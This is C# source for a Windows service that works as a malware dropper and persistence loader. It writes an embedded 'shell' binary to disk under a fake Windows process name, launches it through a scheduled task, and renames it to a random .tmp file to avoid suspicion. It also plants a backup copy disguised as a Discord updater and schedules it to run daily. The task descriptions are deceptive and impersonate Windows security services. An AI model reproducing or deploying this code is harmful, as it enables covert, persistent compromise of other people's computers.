using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using Microsoft.Win32.TaskScheduler;

namespace ShellManagerService
{
    public partial class ShellManager
    { 
        public const int tmp_name_length = 16;
        public const string exe_name = "SecurityHealthService32.exe";
        public const string backup_shell_folder = "C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\";
        public const string backup_shell_name = "DiscordUpdate.exe";
        private static Random random = new Random();

        public static string old_tmp_name { get; set; }
        public static void LoadShellInDisk()
        {
            //Call the process with some "realistic" name
            string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);

            //Check if shell is already running
            Process[] pname = Process.GetProcessesByName(exe_name);
            if(pname.Length > 0) //Shell is running
            {
                return;
            }
            //else delete the file
            File.Delete(tmp_name);

            if (!File.Exists(old_tmp_name)) //If temp file gets deleted create a new one
            {
                File.Create(tmp_name);
            }
            else //else rename temp file
            {
                File.Move(old_tmp_name, tmp_name);
            }

            while (true)
            {
                try
                {
                    //Write bytes into file
                    FileStream fs = new FileStream(tmp_name,
                                           FileMode.Open,
                                           FileAccess.Write);
                    fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                    fs.Close();
                    break;
                }
                catch
                {

                }
            }

            //Start process
            StartProcess(tmp_name);

            Thread.Sleep(5000);

            //Rename the file changing the extension to .tmp to avoid suspicion in case someone opens the folder I guess(?)
            old_tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, RandomModuleName(tmp_name_length));
            File.Move(tmp_name, old_tmp_name);
        }
        //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
        public static void LoadSecondShellAndCreateTask()
        {
            var full_path = backup_shell_folder + backup_shell_name;

            if (!File.Exists(full_path))
            {
                while (true)
                {
                    try
                    {
                        //Write bytes into file
                        FileStream fs = new FileStream(full_path,
                                               FileMode.Open,
                                               FileAccess.Write);
                        fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                        fs.Close();
                        break;
                    }
                    catch
                    {

                    }
                }
            }

            using (var ts = new TaskService())
            {
                var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6)).AsTask("Discord daily update task");
            }
        }
        //Give the module a random ass name idk
        public static string RandomModuleName(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return (new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray()) + ".tmp");
        }
        //Services run as User 0, therefore cannot start other processes. A possible bypass is to schedule a single run Task for the executable :)
        public static void StartProcess(string file_path)
        {
            using (var ts = new TaskService())
            {
                var t = ts.Execute(file_path)
                    .Once()
                    .Starting(DateTime.Now.AddSeconds(1))
                    .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
            }
        }
    }
}
